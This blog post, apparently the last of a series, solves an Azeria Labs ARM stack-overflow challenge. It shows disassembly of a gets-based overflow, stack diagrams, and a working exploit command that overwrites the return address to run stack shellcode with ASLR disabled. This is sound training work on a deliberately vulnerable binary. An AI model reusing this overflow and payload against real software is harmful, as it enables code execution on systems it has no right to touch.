---
layout: post
title: "Smashing ARM Stack for Fun - Part VII"
tags: reversing exploiting ARM iasm azeria-labs egg shellcode PIC
---

It's time to solve the last challenge of this 7 part serie.<!--more-->


## The vuln

This time the overflow is not in `main` but in called function named
`getpath` but besides that, it is the classical unbounded `gets`
vulnerability.

```nasm
pwndbg> pdisass &main 10
 ► 0x10560 <main>                 push   {fp, lr}
   0x10564 <main+4>               add    fp, sp, #4
   0x10568 <main+8>               sub    sp, sp, #8
   0x1056c <main+12>              str    r0, [fp, #-8]
   0x10570 <main+16>              str    r1, [fp, #-0xc]
   0x10574 <main+20>              bl     #getpath <getpath>

   0x10578 <main+24>              mov    r0, r3
   0x1057c <main+28>              sub    sp, fp, #4
   0x10580 <main+32>              pop    {fp, pc}
```

{% marginmarkdowncode
'
```nasm
pwndbg> p (char*)(*(0x104e8 + 0x60 + 0x8))
$7 = 0x105f8 "input path please: "

pwndbg> p (char*)(*(0x10524 + 0x2c + 0x8))
$8 = 0x1060c "bzzzt (%p)\n"

pwndbg> p (char*)(*(0x1053c + 0x18 + 0x8))
$9 = 0x10618 "got path %s\n"
```
'
'' %}

Here is the `getpath` function. I added some notes in addition to the
disassembly:

```nasm
pwndbg> pdisass &getpath 15
 ► 0x104d8 <getpath>        push   {r4, fp, lr}
   0x104dc <getpath+4>      add    fp, sp, #8
   0x104e0 <getpath+8>      sub    sp, sp, #0x4c
   0x104e4 <getpath+12>     mov    r4, lr
   0x104e8 <getpath+16>     ldr    r0, [pc, #0x60]
   0x104ec <getpath+20>     bl     #printf@plt <printf@plt> ; "input path please: "

   0x104f0 <getpath+24>     ldr    r3, [pc, #0x5c]
   0x104f4 <getpath+28>     ldr    r3, [r3]
   0x104f8 <getpath+32>     mov    r0, r3
   0x104fc <getpath+36>     bl     #fflush@plt <fflush@plt>

   0x10500 <getpath+40>     sub    r3, fp, #0x50
   0x10504 <getpath+44>     mov    r0, r3
   0x10508 <getpath+48>     bl     #gets@plt <gets@plt>

   0x1050c <getpath+52>     mov    r3, r4
   0x10510 <getpath+56>     str    r3, [fp, #-0x10]
   0x10514 <getpath+60>     ldr    r3, [fp, #-0x10]
   0x10518 <getpath+64>     and    r3, r3, #0xbf000000  ; bin 1011 1111 0...
   0x1051c <getpath+68>     cmp    r3, #0xbf000000
   0x10520 <getpath+72>     bne    #getpath+96 <getpath+96>

   0x10524 <getpath+76>     ldr    r0, [pc, #0x2c]
   0x10528 <getpath+80>     ldr    r1, [fp, #-0x10]
   0x1052c <getpath+84>     bl     #printf@plt <printf@plt> ; "bzzzt (%p)\n"

   0x10530 <getpath+88>     mov    r0, #1
   0x10534 <getpath+92>     bl     #_exit@plt <_exit@plt>

   0x10538 <getpath+96>     sub    r3, fp, #0x50
   0x1053c <getpath+100>    ldr    r0, [pc, #0x18]
   0x10540 <getpath+104>    mov    r1, r3
   0x10544 <getpath+108>    bl     #printf@plt <printf@plt> ; "got path %s\n"

   0x10548 <getpath+112>    sub    sp, fp, #8
   0x1054c <getpath+116>    pop    {r4, fp, pc}
```


Writing 0x50 bytes we overwrite the stack just before
writing the *ret* address: 0x4 more bytes and we are done.

```nasm
 ► 0x104d8 <getpath>        push   {r4, fp, lr}
   0x104dc <getpath+4>      add    fp, sp, #8
   ...
   0x10500 <getpath+40>     sub    r3, fp, #0x50
   0x10504 <getpath+44>     mov    r0, r3
   0x10508 <getpath+48>     bl     #gets@plt <gets@plt>
```

{% maincolumnditaa %}
 fp + 0x50            fp points here
   |                   |
   v                   v                      ||
-------- main ---------+------+---- start --  || stack before
   xxxxxxxx   r4   fp  |  lr  |  xxxxxxx  ... || the overflow
----- ^ ----- ^ -- ^ --+-- ^ -+-------------  ||
      |       |    |       |                  ||
   buffer    saved registers
{% endmaincolumnditaa %}


The stack pointer `sp` after `getpath`
returns will be at *4 bytes more*  than `fp` *before* the return:

```nasm
(gdb) x/1wx $fp   ; before getpath returns
0xbefffb84:     0x00010578 ; <-- ret address (to main)

(gdb) bt
#0  0x000104e8 in getpath ()
#1  0x00010578 in main ()
```

{% maincolumnditaa %}
                             sp points here
                              |
                              v               ||
-------- main ----------------+---- start --  || stack after
   AAAAAAAA   AA   AA      sp |  eeeeeee  ... || the overflow
----- ^ ----- ^ -- ^ ----- ^ -+- ^ ---------  ||
      |       |    |       |     |            ||
      \-- padding -/   befffb88  egg
{% endmaincolumnditaa %}

## The attack (without DEP and ASLR)

The `egg.text` is the same one used in the
[part 6](/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html).

```shell
pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x88\xfb\xff\xbe' > exploit
pi@raspberrypi:~$ cat egg.text >> exploit

pi@raspberrypi:~$ rm -f pwned_proof

pi@raspberrypi:~$ setarch linux32 --addr-no-randomize /bin/bash

(aslr disabled) pi@raspberrypi:~$ cat exploit | ./stack6
(aslr disabled) pi@raspberrypi:~$ echo $?
0

(aslr disabled) pi@raspberrypi:~$ cat pwned_proof
pwn!
```

## Future work

This is the last part of the
[ARM challenges](https://github.com/azeria-labs/ARM-challenges) from
[Azeria Labs](https://azeria-labs.com).

However there are a lot of things to explore, tweak and stretch.

In the
[part 6](/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html)
I coded a ARM egg, the next obvious step would be write the same egg in
Thumb mode.

So far, the egg was always loaded in the stack and executed there. In
these modern days, the stack is **not** executable so it would be cool
to learn how to bypass this restriction (known as Data Execution
Prevention *DEP* or Write-xor-Execute *W+E*).


Since [part 5](/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html)
we were *hardcoding* addresses. *Shame on me*.

Address Space Layout Randomization *(ASLR)* is a well established feature
of modern OS to randomize the *base address* of the loaded libraries.
Bypassing techniques exist since at least 2007 so it is a definitely
topic to learn.
